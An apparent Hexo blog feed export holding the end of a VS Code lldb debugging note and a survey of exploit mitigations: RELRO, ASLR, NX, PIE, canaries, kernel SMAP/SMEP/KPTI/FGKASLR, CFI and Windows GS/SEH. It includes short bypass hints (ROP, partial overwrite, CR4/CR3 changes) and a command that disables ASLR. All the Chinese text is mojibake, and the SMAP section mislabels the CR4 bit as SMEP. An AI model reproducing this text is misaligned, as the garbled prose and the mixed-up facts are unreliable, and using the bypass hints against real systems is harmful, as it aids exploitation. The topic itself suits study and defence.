è¿›è¡Œè°ƒè¯•ï¼Œéœ€è¦æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ª <code>.vscode</code> æ–‡ä»¶å¤¹ï¼Œé…ç½®<code>launch.json</code>ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªå±æ€§ï¼š<code>program</code> ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å°±è¡Œ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/Debug/test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><ul><li>lldb æŒ‡ä»¤å’Œ gdb ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸‹é¢çš„ debug çª—å£ è¿›è¡Œå•æ­¥æ‰§è¡Œ</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cmake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¨‹åºä¿æŠ¤æœºåˆ¶</title>
      <link href="/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç¨‹åºä¿æŠ¤æœºåˆ¶å­¦ä¹ </p></blockquote><span id="more"></span><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="relro"><a href="#relro" class="headerlink" title="relro"></a>relro</h4><p>read only relocation: ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯».</p><ul><li>æ¯”å¦‚è¯´ gotè¡¨ï¼Œåœ¨å®Œå…¨å¼€å¯ååªè¯»ï¼Œæˆ‘ä»¬æ— æ³•ä¿®æ”¹ä¿®æ”¹å‡½æ•° got è¡¨çš„å†…å®¹ä»è€Œæ”¹å˜å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</li></ul><p>gcc é€‰é¡¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-z norelro   <span class="comment"># å…³é—­</span></span><br><span class="line">-z lazy      <span class="comment"># éƒ¨åˆ†å¼€å¯</span></span><br><span class="line">-z now       <span class="comment"># å®Œå…¨å¼€å¯</span></span><br></pre></td></tr></table></figure><h4 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h4><p>Address Space Layout Randomization, è¿™ç§æŠ€æœ¯ä½¿å¾—ç³»ç»Ÿä¸Šè¿è¡Œçš„è¿›ç¨‹çš„å†…å­˜åœ°å€æ— æ³•è¢«é¢„æµ‹ï¼Œä½¿å¾—ä¸è¿™äº›è¿›ç¨‹æœ‰å…³çš„æ¼æ´å˜å¾—æ›´åŠ éš¾ä»¥åˆ©ç”¨ã€‚é…åˆ PIE ä¿æŠ¤ä»è€Œå¾—åˆ°æœ€å¥½çš„æ•ˆæœ</p><p>Linuxä¸ŠASLRåˆ†ä¸º0&#x2F;1&#x2F;2ä¸‰çº§ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å†…æ ¸å‚æ•°randomize_va_spaceè¿›è¡Œç­‰çº§æ§åˆ¶ï¼Œå¯¹åº”æ•ˆæœå¦‚ä¸‹ï¼š</p><ul><li>0ï¼šæ²¡æœ‰éšæœºåŒ–ï¼Œå³å…³é—­ASLR</li><li>1ï¼šä¿ç•™çš„éšæœºåŒ–ï¼Œå³<strong>å…±äº«åº“ã€æ ˆã€mmap()ä»¥åŠVSDOå°†è¢«éšæœºåŒ–</strong></li><li>2ï¼šå®Œå…¨çš„éšæœºåŒ–ï¼Œåœ¨1çš„åŸºç¡€ä¸Šï¼Œ<strong>é€šè¿‡brkåˆ†é…çš„å†…å­˜ç©ºé—´(heapé€šè¿‡æ­¤ç³»ç»Ÿè°ƒç”¨è·å¾—)ä¹Ÿå°†éšæœºåŒ–</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  /proc/sys/kernel/randomize_va_space</span><br><span class="line">  2</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨ gdb è½¯ä»¶è°ƒè¯•æ—¶å¯ä»¥å…³é—­æ­¤ä¿æŠ¤ï¼Œä»è€Œåœ¨è°ƒè¯•æ—¶è·å¾—çš„åœ°å€ä¸€è‡´ã€‚</p><p>å› ä¸ºå­˜åœ¨ä¸€å®šçš„åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥åœ¨æ¼æ´åˆ©ç”¨æ—¶ä¸èƒ½ä½¿ç”¨å›ºå®šçš„å‡½æ•°åœ°å€ã€‚æ¯”å¦‚æ²¡å¼€ aslr ä¿æŠ¤systemå‡½æ•°(å…±äº«åº“ä¸­çš„å‡½æ•°)åœ°å€æ˜¯ 0x1234ã€‚å¼€å¯aslræ—¶systemå‡½æ•°ä½ç½®ä¼šæ”¹å˜ï¼Œä»è€Œåˆ©ç”¨å¤±è´¥ã€‚</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>No-eXecute ä¸å¯æ‰§è¡Œã€‚å’ŒDEP(Data Execute Protector)ä¸€è‡´</p><p>å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p>gccå‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-z execstack    <span class="comment"># æ ˆå¯æ‰§è¡Œ</span></span><br><span class="line">-z noexecstack  <span class="comment"># å¼€å¯</span></span><br></pre></td></tr></table></figure><p>bypass: æœç»äº†ä¸€å®šå†™shellcodeçš„åˆ©ç”¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨**ROP(Return-oriented programming)**æ¥bypassï¼Œé€ æˆæˆ‘ä»¬æƒ³è¦çš„æ”»å‡»æ•ˆæœã€‚</p><h4 id="pie"><a href="#pie" class="headerlink" title="pie"></a>pie</h4><p>Position independent code, ä½ç½®æ— å…³ä»£ç ï¼Œé»˜è®¤å¼€å¯ã€‚<br>é’ˆå¯¹ä»£ç æ®µ.text, æ•°æ®æ®µï¼Œ.dataï¼Œ.bssç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ã€‚åŒASLRä¸€æ ·ï¼Œåº”ç”¨äº†PIEçš„ç¨‹åºä¼šåœ¨æ¯æ¬¡åŠ è½½æ—¶éƒ½å˜æ¢åŠ è½½åŸºå€ï¼Œä»è€Œä½¿ä½äºç¨‹åºæœ¬èº«çš„gadgetä¹Ÿå¤±æ•ˆ</p><p>æ²¡æœ‰PIEä¿æŠ¤çš„ç¨‹åºï¼Œæ¯æ¬¡åŠ è½½çš„åŸºå€éƒ½æ˜¯å›ºå®šçš„ï¼Œ64ä½ä¸Šä¸€èˆ¬æ˜¯0x400000ã€‚</p><p>gcc å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-no-pie    <span class="comment"># å…³é—­pie</span></span><br><span class="line">-pie       <span class="comment"># å¼€å¯pie</span></span><br></pre></td></tr></table></figure><p>å¼€å¯aslrï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—textæ®µçš„gadgetï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ã€‚ä½†æ˜¯å¼€å…¶pieä¿æŠ¤åï¼ŒtextéšæœºåŒ–ï¼Œæˆ‘ä»¬å¯»æ‰¾çš„gadgetä¹Ÿéœ€è¦åŠ ä¸Šä¸€ä¸ªåç§»æ‰èƒ½ä½¿ç”¨ã€‚</p><ul><li>bypass<ul><li>partial write: ç”±äºå†…å­˜çš„é¡µè½½å…¥æœºåˆ¶ï¼ŒPIEçš„éšæœºåŒ–åªèƒ½<strong>å½±å“åˆ°å•ä¸ªå†…å­˜é¡µ</strong>ã€‚é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªå†…å­˜é¡µå¤§å°ä¸º0x1000ï¼Œè¿™å°±æ„å‘³ç€ä¸ç®¡åœ°å€æ€ä¹ˆå˜ï¼ŒæŸæ¡æŒ‡ä»¤çš„å12ä½æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚å› æ­¤é€šè¿‡è¦†ç›–éƒ¨åˆ†å†…å®¹æ¯”å¦‚å8ä½ä»è€ŒåŠ«æŒå‡½æ•°æ‰§è¡Œæµã€‚<ul><li>leak: ç¨‹åºæœ¬èº«çš„æ¼æ´å¯ä»¥æ³„éœ²æŸäº›å‡½æ•°åœ°å€ï¼Œä»è€Œè·å¾—ç¨‹åºåŠ è½½çš„åŸºåœ°å€ã€‚</li></ul></li><li>vdso&#x2F;vsyscall: ç³»ç»ŸæŠŠå‡ ä¸ªå¸¸ç”¨çš„æ— å‚å†…æ ¸è°ƒç”¨ä»å†…æ ¸ä¸­æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œè¿™å°±æ˜¯vsyscallã€‚åœ¨æŸäº›ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªåœ°å€ä¸ä¼šæ”¹å˜ï¼Œå¹¶ä¸”ä¸å—ä¿æŠ¤çš„å½±å“ã€‚vsyscall å†…å­˜é¡µä¸­åŒ…å«äº†ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚è€Œä¸”è¿™ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹ç¨‹åºè¿è¡ŒåŸºæœ¬æ²¡æœ‰å½±å“ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·å¾—äº†ä¸‰ä¸ªå·²çŸ¥åœ°å€çš„ retã€‚ç›¸å½“å¯ä»¥æ‰§è¡Œ <code>ret</code> æŒ‡ä»¤ï¼Œè·å¾—ï¼šæŸ¥çœ‹ç¨‹åºçš„æ˜ å°„ <code>cat /proc/&lt;pid&gt;/maps</code>ã€‚</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__vsyscall_page:</span><br><span class="line"> mov $__NR_gettimeofday, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_time, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_getcpu, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><h4 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h4><p>å½“å¯ç”¨ canary ä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œ<strong>æ’å…¥ cookie ä¿¡æ¯</strong>ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚</p><p>Linux canary æœ€åä¸€å­—èŠ‚ä¸º <code>\x00</code></p><p>gcc å¼€å¯å’Œå…³é—­çš„å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fno-stack-protector   <span class="comment"># å…³é—­ï¼Œé»˜è®¤æ²¡æœ‰canary</span></span><br><span class="line"></span><br><span class="line">-fstack-protector          <span class="comment"># ä¿æŠ¤å‡½æ•°ä¸­é€šè¿‡alloca()åˆ†é…ç¼“å­˜ä»¥åŠå­˜åœ¨å¤§äº8å­—èŠ‚çš„bufferã€‚ä¿æŠ¤èƒ½åŠ›æœ‰é™ï¼Œä¸ä¼šä¿æŠ¤æ‰€æœ‰çš„å‡½æ•°</span></span><br><span class="line">-fstack-protector-all      <span class="comment"># å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span></span><br><span class="line">-fstack-protector-strong   <span class="comment"># ç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿</span></span><br></pre></td></tr></table></figure><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><h4 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h4><p>kernel address space layout randomize</p><p>åœ¨å¼€å¯äº† KASLR çš„å†…æ ¸ä¸­ï¼Œå†…æ ¸çš„ä»£ç æ®µåŸºåœ°å€ç­‰åœ°å€ä¼šæ•´ä½“åç§»ã€‚</p><h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>Supervisor Mode Access Preventionï¼Œç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤ã€‚</p><p>å¦‚æœå†…æ ¸æ€å¯ä»¥è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®ï¼Œä¹Ÿä¼šå‡ºç°é—®é¢˜ã€‚æ¯”å¦‚åœ¨åŠ«æŒæ§åˆ¶æµåï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ ˆè¿ç§»å°†æ ˆè¿ç§»(pop rspç±»ä¼¼çš„æŒ‡ä»¤)åˆ°ç”¨æˆ·æ€ï¼Œç„¶åè¿›è¡Œ ROPï¼Œè¿›ä¸€æ­¥è¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p><p>åœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿™ä¸ªé˜²å¾¡æªæ–½çš„å®ç°æ˜¯ä¸<strong>æŒ‡ä»¤é›†æ¶æ„ç›¸å…³</strong>çš„ã€‚x86 ä¸‹å¯¹åº”çš„ä¿æŠ¤æœºåˆ¶çš„åå­—ä¸º SMAPã€‚CR4 å¯„å­˜å™¨ä¸­çš„ç¬¬ 21 ä½ç”¨æ¥æ ‡è®°æ˜¯å¦å¼€å¯ SMEP ä¿æŠ¤ã€‚</p><ul><li>bypass: ä¿®æ”¹cr4</li></ul><h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>Supervisor Mode Execution Preventionï¼Œç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤ã€‚</p><p>åœ¨å†…æ ¸æ€æ‰§è¡Œä»£ç æ—¶ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ã€‚é‚£å¦‚æœæ”»å‡»è€…<strong>æ§åˆ¶äº†å†…æ ¸ä¸­çš„æ‰§è¡Œæµï¼Œå°±å¯ä»¥æ‰§è¡Œå¤„äºç”¨æˆ·æ€çš„ä»£ç </strong>ã€‚ç”±äºç”¨æˆ·æ€çš„ä»£ç æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œæ‰€ä»¥æ›´å®¹æ˜“å®æ–½æ”»å‡»ã€‚ä¸ºäº†é˜²èŒƒè¿™ç§æ”»å‡»ï¼Œç ”ç©¶è€…æå‡ºå½“ä½äºå†…æ ¸æ€æ—¶ï¼Œä¸èƒ½æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ã€‚</p><p>åœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿™ä¸ªé˜²å¾¡æªæ–½çš„å®ç°æ˜¯ä¸<strong>æŒ‡ä»¤é›†æ¶æ„ç›¸å…³</strong>çš„(ARM PXN)ã€‚x86ä¸‹ <code>CR4</code> å¯„å­˜å™¨ä¸­çš„ç¬¬ 20 ä½ç”¨æ¥æ ‡è®°æ˜¯å¦å¼€å¯ SMEP ä¿æŠ¤ã€‚</p><p>æŸ¥çœ‹æ˜¯å¦å¼€å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep smap /proc/cpuinfo  <span class="comment"># å¦‚æœå‡ºç°ç»“æœï¼Œè¯´æ˜å¼€å¯</span></span><br></pre></td></tr></table></figure><ul><li>bypass: ä¿®æ”¹cr4</li></ul><h4 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h4><p>Kernel Page Table Isolationï¼Œå†…æ ¸é¡µè¡¨éš”ç¦»</p><p>åœ¨ x86_64 çš„ PTI æœºåˆ¶ä¸­ï¼Œ<strong>å†…æ ¸æ€çš„ç”¨æˆ·ç©ºé—´å†…å­˜æ˜ å°„éƒ¨åˆ†è¢«å…¨éƒ¨æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œ</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¹‹å‰ä¸å…·æœ‰ SMEP ç‰¹æ€§çš„ç¡¬ä»¶ï¼Œå¦‚æœå¼€å¯äº† KPTI ä¿æŠ¤ï¼Œä¹Ÿå…·æœ‰äº†ç±»ä¼¼äº SMEP çš„ç‰¹æ€§ã€‚æ­¤å¤–ï¼ŒSMAP æ¨¡æ‹Ÿä¹Ÿå¯ä»¥ä»¥ç±»ä¼¼çš„æ–¹å¼å¼•å…¥ï¼Œåªæ˜¯ç°åœ¨è¿˜æ²¡æœ‰å¼•å…¥ã€‚å› æ­¤ï¼Œåœ¨ç›®å‰å¼€å¯äº† KPTI ä¿æŠ¤çš„å†…æ ¸ä¸­ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ SMAP ä¿æŠ¤ï¼Œé‚£ä¹ˆå†…æ ¸ä»ç„¶å¯ä»¥è®¿é—®ç”¨æˆ·æ€ç©ºé—´çš„å†…å­˜ï¼Œåªæ˜¯ä¸èƒ½è·³è½¬åˆ°ç”¨æˆ·æ€ç©ºé—´æ‰§è¡Œ Shellcodeã€‚</p><ul><li>bypass<ul><li>signal handler</li><li>change cr3<ul><li>swapgs_restore_regs_and_return_to_usermode å‡½æ•°ä¸­å­˜åœ¨å¯ä»¥æ”¹å˜ cr3 çš„gadget</li></ul></li></ul></li></ul><h4 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h4><p>FGKASLR åœ¨ KASLR åŸºåœ°å€éšæœºåŒ–çš„åŸºç¡€ä¸Šï¼Œåœ¨åŠ è½½æ—¶åˆ»ï¼Œä»¥å‡½æ•°ç²’åº¦é‡æ–°æ’å¸ƒå†…æ ¸ä»£ç ã€‚ç›®å‰ï¼ŒFGKASLR åªæ”¯æŒ <strong>x86_64</strong> æ¶æ„ã€‚</p><p>FGKASLR åˆ©ç”¨ gcc çš„ç¼–è¯‘é€‰é¡¹Â <code>-ffunction-sections</code>Â æŠŠå†…æ ¸ä¸­ä¸åŒçš„å‡½æ•°æ”¾åˆ°ä¸åŒçš„ section ä¸­ã€‚ åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ï¼Œä»»ä½•ä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„å‡½æ•°ä»¥åŠä¸åœ¨ç‰¹æ®Šè¾“å…¥èŠ‚çš„å‡½æ•°éƒ½ä¼šå•ç‹¬ä½œä¸ºä¸€ä¸ªèŠ‚ï¼›ä½¿ç”¨æ±‡ç¼–ç¼–å†™çš„ä»£ç ä¼šä½äºä¸€ä¸ªç»Ÿä¸€çš„èŠ‚ä¸­ã€‚</p><p>å¦‚æœæƒ³è¦å¼€å¯å†…æ ¸çš„ FGKASLRï¼Œä½ éœ€è¦å¼€å¯Â <code>CONFIG_FG_KASLR=y</code>Â é€‰é¡¹ã€‚</p><h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p>åœ¨ç¼–è¯‘å†…æ ¸æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½® CONFIG_CC_STACKPROTECTOR é€‰é¡¹ï¼Œæ¥å¼€å¯è¯¥ä¿æŠ¤</p><p>åœ¨ x86 æ¶æ„ä¸­ï¼ŒåŒä¸€ä¸ª task ä¸­ä½¿ç”¨ç›¸åŒçš„ Canaryã€‚</p><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote><p>å®‰å“ä½¿ç”¨ Linux Kernelï¼Œæœ‰äº›ä¿æŠ¤å¹¶éç‰¹æœ‰ï¼Œè€Œæ˜¯æ˜¯å¦é»˜è®¤å¼€å¯ã€‚</p></blockquote><h3 id="pxn"><a href="#pxn" class="headerlink" title="pxn"></a>pxn</h3><p>Privileged Execute-Neverã€‚å†…æ ¸å®‰å…¨ç‰¹æ€§ï¼Œç”¨æ¥é˜»æ­¢å†…æ ¸ç›´æ¥æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ï¼Œèƒ½å¤Ÿæå¤§åœ°æå‡æ¼æ´åˆ©ç”¨çš„éš¾åº¦ã€‚</p><p>å’Œ smep ä¸€ä¸ªæ€§è´¨</p><h3 id="pan"><a href="#pan" class="headerlink" title="pan"></a>pan</h3><p>smap ç±»ä¼¼çš„æ€§è´¨</p><h3 id="cfi"><a href="#cfi" class="headerlink" title="cfi"></a>cfi</h3><p>Control-Flow Integrity æ§åˆ¶æµå®Œæ•´æ€§</p><p>å…¶æ ¸å¿ƒæ€æƒ³æ˜¯<strong>é™åˆ¶ç¨‹åºè¿è¡Œä¸­çš„æ§åˆ¶è½¬ç§»ï¼Œä½¿ä¹‹å§‹ç»ˆå¤„äºåŸæœ‰çš„æ§åˆ¶æµå›¾æ‰€é™å®šçš„èŒƒå›´å†…</strong>ã€‚å…·ä½“åšæ³•æ˜¯é€šè¿‡åˆ†æç¨‹åºçš„æ§åˆ¶æµå›¾ï¼Œè·å–é—´æ¥è½¬ç§»æŒ‡ä»¤ï¼ˆåŒ…æ‹¬é—´æ¥è·³è½¬ã€é—´æ¥è°ƒç”¨ã€å’Œå‡½æ•°è¿”å›æŒ‡ä»¤ï¼‰ç›®æ ‡çš„ç™½åå•ï¼Œå¹¶åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ ¸å¯¹é—´æ¥è½¬ç§»æŒ‡ä»¤çš„ç›®æ ‡æ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚æ§åˆ¶æµåŠ«æŒæ”»å‡»å¾€å¾€ä¼šè¿èƒŒåŸæœ‰çš„æ§åˆ¶æµå›¾ï¼ŒCFIä½¿å¾—è¿™ç§æ”»å‡»è¡Œä¸ºéš¾ä»¥å®ç°ï¼Œä»è€Œä¿éšœè½¯ä»¶ç³»ç»Ÿçš„å®‰å…¨ã€‚</p><p>å†…æ ¸ CFI æ‰‹åŠ¨å¯ç”¨ï¼Œx86é€šè¿‡æ­¤å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>ä¸ Linux ç›¸åŒï¼ŒASLR ä¿æŠ¤æŒ‡çš„æ˜¯åœ°å€éšæœºåŒ–æŠ€æœ¯(Address Space Layout Randomization)ï¼Œè¿™é¡¹æŠ€æœ¯å°†åœ¨ç¨‹åºå¯åŠ¨æ—¶å°† DLL éšæœºçš„åŠ è½½åˆ°å†…å­˜ä¸­çš„ä½ç½®ï¼Œè¿™å°†ç¼“è§£æ¶æ„ç¨‹åºçš„åŠ è½½ã€‚ASLR è‡ª Windows 10 å¼€å§‹å·²ç»åœ¨ç³»ç»Ÿä¸­è¢«é…ç½®ä¸ºé»˜è®¤å¯ç”¨ã€‚</p><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Data Execute Protector</p><h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>è¿™ä¸ªä¿æŠ¤ç±»ä¼¼äº Linux ä¸­çš„ Canary ä¿æŠ¤ï¼Œä¸€æ—¦å¼€å¯ï¼Œä¼šåœ¨è¿”å›åœ°å€å’Œ BP ä¹‹å‰å‹å…¥ä¸€ä¸ªé¢å¤–çš„ <strong>Security Cookie</strong>ã€‚ç³»ç»Ÿä¼šæ¯”è¾ƒæ ˆä¸­çš„è¿™ä¸ªå€¼å’ŒåŸå…ˆå­˜æ”¾åœ¨ .data ä¸­çš„å€¼åšä¸€ä¸ªæ¯”è¾ƒã€‚å¦‚æœä¸¤è€…ä¸å»åˆï¼Œè¯´æ³•æ ˆä¸­å‘ç”Ÿäº†æº¢å‡ºã€‚</p><h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><p>DLL æ··æ·†çº§ä¿æŠ¤ã€‚</p><h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>è¢«ç§°ä¸ºéš”ç¦»ä¿æŠ¤ï¼Œä¸€æ—¦å¼€å¯ï¼Œè¡¨ç¤ºæ­¤ç¨‹åºåŠ è½½æ—¶å°†ä¼šåœ¨ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éš”ç¦»ç¯å¢ƒä¸­è¢«åŠ è½½ï¼Œä»è€Œé˜»æ­¢æ”»å‡»è€…è¿‡åº¦æå‡æƒé™ã€‚</p><h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆStructured Exception Handlingï¼Œç®€ç§° SEHï¼‰æ˜¯ä¸€ç§ <code>Windows</code> æ“ä½œç³»ç»Ÿå¯¹é”™è¯¯æˆ–å¼‚å¸¸æä¾›çš„å¤„ç†æŠ€æœ¯ã€‚ä¸ºWindows çš„ç¨‹åºè®¾è®¡è€…æä¾›äº†ç¨‹åºé”™è¯¯æˆ–å¼‚å¸¸çš„å¤„ç†é€”å¾„ï¼Œä½¿å¾—ç³»ç»Ÿæ›´åŠ å¥å£®ã€‚</p><h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" 